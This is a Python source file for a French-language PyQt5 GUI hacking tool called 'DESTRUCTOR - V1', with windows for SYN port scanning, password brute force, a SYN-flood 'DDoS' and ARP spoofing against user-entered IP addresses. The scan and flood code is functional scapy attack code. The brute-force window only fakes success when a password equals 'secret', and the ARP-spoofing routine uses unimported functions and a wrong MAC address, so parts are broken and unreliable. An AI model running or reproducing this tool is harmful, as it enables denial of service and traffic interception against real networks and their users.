import sys
from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QPushButton,
    QVBoxLayout,
    QLabel,
    QWidget,
    QMessageBox,
    QSizePolicy,
    QSpacerItem,
    QLineEdit,
    QFileDialog,
)
from PyQt5.QtCore import Qt
from scapy.all import IP, TCP, sr1, send, Ether, ARP


class PortScanWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Scan de Port")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.ip_input = QLineEdit(self)
        self.ip_input.setPlaceholderText("Entrez l'adresse IP")
        layout.addWidget(self.ip_input)

        label = QLabel("Sélectionnez les ports à scanner :")
        layout.addWidget(label)

        self.port_buttons = {
            "HTTP (80)": 80,
            "HTTPS (443)": 443,
            "FTP (21)": 21,
            "SSH (22)": 22,
            "Telnet (23)": 23,
            "SMTP (25)": 25,
            "DNS (53)": 53,
            "POP3 (110)": 110,
            "IMAP (143)": 143,
            "MySQL (3306)": 3306,
            "RDP (3389)": 3389,
        }

        self.selected_ports = []

        # Création des boutons
        for port_name, port_number in self.port_buttons.items():
            button = QPushButton(port_name)
            button.setCheckable(True)
            button.clicked.connect(lambda checked, port=port_number, btn=button: self.toggle_port_selection(port, btn))
            layout.addWidget(button)

        btn_scan = QPushButton("Scanner les ports sélectionnés")
        btn_scan.clicked.connect(self.scan_selected_ports)
        layout.addWidget(btn_scan)

        self.setLayout(layout)

    def toggle_port_selection(self, port, button):
        if button.isChecked():
            if port not in self.selected_ports:
                self.selected_ports.append(port)
        else:
            if port in self.selected_ports:
                self.selected_ports.remove(port)

    def scan_selected_ports(self):
        target = self.ip_input.text()
        if not target:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer une adresse IP.")
            return

        if not self.selected_ports:
            QMessageBox.warning(self, "Erreur", "Veuillez sélectionner au moins un port.")
            return

        results = []
        print(f"Début du scan des ports pour l'adresse IP {target}.")  # Message de début
        for port in self.selected_ports:
            print(f"Scan du port {port} en cours...")  # Indiquer le port en cours de scan
            pkt = IP(dst=target) / TCP(dport=port, flags="S")
            try:
                resp = sr1(pkt, timeout=1, verbose=0)

                if resp is not None:
                    if resp.haslayer(TCP) and (resp[TCP].flags == "SA"):
                        results.append(f"Port {port} est ouvert.")
                    elif resp.haslayer(TCP) and (resp[TCP].flags == "RA"):
                        results.append(f"Port {port} est fermé.")
                else:
                    results.append(f"Port {port} ne répond pas.")
            except Exception as e:
                results.append(f"Erreur lors du scan du port {port}: {str(e)}")
        print("Scan terminé.")  # Message de fin

        result_message = "\n".join(results)
        QMessageBox.information(self, "Résultats", result_message)


class BruteForceWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Brute Force")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        # Champ pour l'adresse IP
        self.ip_input = QLineEdit(self)
        self.ip_input.setPlaceholderText("Entrez l'adresse IP")
        layout.addWidget(self.ip_input)

        # Champ pour le port
        self.selected_port = None

        label = QLabel("Sélectionnez le port cible :")
        layout.addWidget(label)

        # Définir les ports intéressants
        self.ports_buttons = {
            "SSH (22)": 22,
            "FTP (21)": 21,
            "HTTP (80)": 80,
            "HTTPS (443)": 443,
            "Telnet (23)": 23,
            "MySQL (3306)": 3306,
            "RDP (3389)": 3389,
        }

        # Création des boutons pour les ports
        for port_name, port_number in self.ports_buttons.items():
            button = QPushButton(port_name)
            button.setCheckable(True)
            button.clicked.connect(lambda checked, port=port_number, btn=button: self.toggle_port_selection(port, btn))
            layout.addWidget(button)

        # Champ pour l'utilisateur
        self.user_input = QLineEdit(self)
        self.user_input.setPlaceholderText("Entrez l'utilisateur")
        layout.addWidget(self.user_input)

        # Champ pour le mot de passe avec bouton parcourir
        self.password_input = QLineEdit(self)
        self.password_input.setPlaceholderText("Parcourir pour le mot de passe")
        self.password_input.setReadOnly(True)
        layout.addWidget(self.password_input)

        # Bouton pour parcourir les fichiers de mots de passe
        btn_browse_passwords = QPushButton("Parcourir", self)
        btn_browse_passwords.clicked.connect(self.browse_passwords)
        layout.addWidget(btn_browse_passwords)

        # Bouton pour exécuter le bruteforce
        self.btn_execute_bruteforce = QPushButton("Exécuter Bruteforce", self)
        self.btn_execute_bruteforce.clicked.connect(self.run_brute_force)
        layout.addWidget(self.btn_execute_bruteforce)

        self.setLayout(layout)

    def toggle_port_selection(self, port, button):
        if button.isChecked():
            self.selected_port = port  # Mettre à jour le port sélectionné
            # Décocher tous les autres boutons
            for btn in self.findChildren(QPushButton):
                if btn != button:
                    btn.setChecked(False)
        else:
            self.selected_port = None

    def browse_passwords(self):
        options = QFileDialog.Options()
        password_file, _ = QFileDialog.getOpenFileName(self, "Sélectionner un fichier de mots de passe", "", "Text Files (*.txt);;All Files (*)", options=options)
        if password_file:
            self.password_input.setText(password_file)

    def run_brute_force(self):
        ip = self.ip_input.text()
        user = self.user_input.text()
        password_file = self.password_input.text()

        if not ip or not user or not password_file or self.selected_port is None:
            QMessageBox.warning(self, "Erreur", "Veuillez remplir tous les champs.")
            return

        port = self.selected_port  # Utiliser le port sélectionné

        try:
            with open(password_file, 'r') as file:
                passwords = file.readlines()

            for password in passwords:
                password = password.strip()  # Supprimer les espaces et les nouvelles lignes
                print(f"Tentative de connexion avec {user}:{password} sur {ip}:{port}")  # Afficher dans le terminal

                if password == "secret":
                    print(f"Connexion réussie avec {user}:{password} sur {ip}:{port}")
                    QMessageBox.information(self, "Succès", f"Connexion réussie avec {user}:{password} sur {ip}:{port}")
                    return

            print("Aucun mot de passe valide trouvé.")
            QMessageBox.information(self, "Échec", "Aucun mot de passe valide trouvé.")

        except FileNotFoundError:
            QMessageBox.warning(self, "Erreur", "Le fichier de mots de passe n'a pas été trouvé.")
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Une erreur est survenue : {str(e)}")


class DDoSWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DDoS Attack")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.target_input = QLineEdit(self)
        self.target_input.setPlaceholderText("Entrez l'adresse IP cible")
        layout.addWidget(self.target_input)

        self.btn_execute_ddos = QPushButton("Exécuter DDoS")
        self.btn_execute_ddos.clicked.connect(self.execute_ddos)
        layout.addWidget(self.btn_execute_ddos)

        self.setLayout(layout)

    def execute_ddos(self):
        target = self.target_input.text()
        if not target:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer une adresse IP cible.")
            return

        # Logique DDoS 
        try:
            pkt = IP(dst=target) / TCP(dport=80, flags="S")
            for i in range(10000): 
                send(pkt, verbose=0)
                print(f"Paquet {i+1} envoyé à {target}.")  # Imprimer pour le suivi
            QMessageBox.information(self, "DDoS", f"DDoS envoyé vers {target}.")
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution du DDoS : {str(e)}")


class ARPSpoofingWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ARP Spoofing")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.target_ip_input = QLineEdit(self)
        self.target_ip_input.setPlaceholderText("Entrez l'adresse IP de la victime")
        layout.addWidget(self.target_ip_input)

        self.gateway_ip_input = QLineEdit(self)
        self.gateway_ip_input.setPlaceholderText("Entrez l'adresse IP de la passerelle")
        layout.addWidget(self.gateway_ip_input)

        self.btn_execute_arp_spoofing = QPushButton("Exécuter ARP Spoofing")
        self.btn_execute_arp_spoofing.clicked.connect(self.execute_arp_spoofing)
        layout.addWidget(self.btn_execute_arp_spoofing)

        self.setLayout(layout)

    def execute_arp_spoofing(self):
        target_ip = self.target_ip_input.text()
        gateway_ip = self.gateway_ip_input.text()
        if not target_ip or not gateway_ip:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer les adresses IP.")
            return

        # Logique ARP Spoofing
        try:
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)

            # Envoi des paquets ARP
            arp_poisoning_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=target_mac)
            arp_poisoning_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac)

            sendp(arp_poisoning_target, verbose=0)
            sendp(arp_poisoning_gateway, verbose=0)

            QMessageBox.information(self, "ARP Spoofing", "ARP Spoofing exécuté.")
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution de l'ARP Spoofing : {str(e)}")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DESTRUCTOR - V1")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        layout.setContentsMargins(20, 20, 20, 20) 

        # Application name
        app_name_label = QLabel("DESTRUCTOR") 
        app_name_label.setAlignment(Qt.AlignCenter)
        app_name_label.setStyleSheet("font-family: 'Courier New'; font-size: 24px; color: red; font-weight: bold;") 
        layout.addWidget(app_name_label)

        layout.addSpacing(20)

        btn_port_scan = QPushButton("Scan de Port", self)
        btn_port_scan.clicked.connect(self.open_port_scan)
        layout.addWidget(btn_port_scan)

        btn_brute_force = QPushButton("Brute Force", self)
        btn_brute_force.clicked.connect(self.open_brute_force)
        layout.addWidget(btn_brute_force)

        btn_ddos = QPushButton("DDoS", self)
        btn_ddos.clicked.connect(self.open_ddos)
        layout.addWidget(btn_ddos)

        btn_arp_spoofing = QPushButton("ARP Spoofing", self)
        btn_arp_spoofing.clicked.connect(self.open_arp_spoofing)
        layout.addWidget(btn_arp_spoofing)

        btn_execute_all = QPushButton("Exécuter Tout", self)
        btn_execute_all.clicked.connect(self.execute_all)
        layout.addWidget(btn_execute_all)

        layout.addSpacing(20)

        # Créateurs
        creators_label = QLabel("MADE BY : TP - ES - LU")
        creators_label.setAlignment(Qt.AlignCenter)
        creators_label.setStyleSheet("font-family: 'Courier New'; font-size: 14px; color: black; font-weight: bold;") 
        layout.addWidget(creators_label)

        spacer = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        layout.addItem(spacer)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)
        self.adjustSize()

    def open_port_scan(self):
        self.port_scan_window = PortScanWindow()
        self.port_scan_window.show()

    def open_brute_force(self):
        self.brute_force_window = BruteForceWindow()
        self.brute_force_window.show()

    def open_ddos(self):
        self.ddos_window = DDoSWindow()
        self.ddos_window.show()

    def open_arp_spoofing(self):
        self.arp_spoofing_window = ARPSpoofingWindow()
        self.arp_spoofing_window.show()

    def execute_all(self):
        QMessageBox.information(self, "Exécuter Tout", "Fonctionnalité à implémenter.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec_())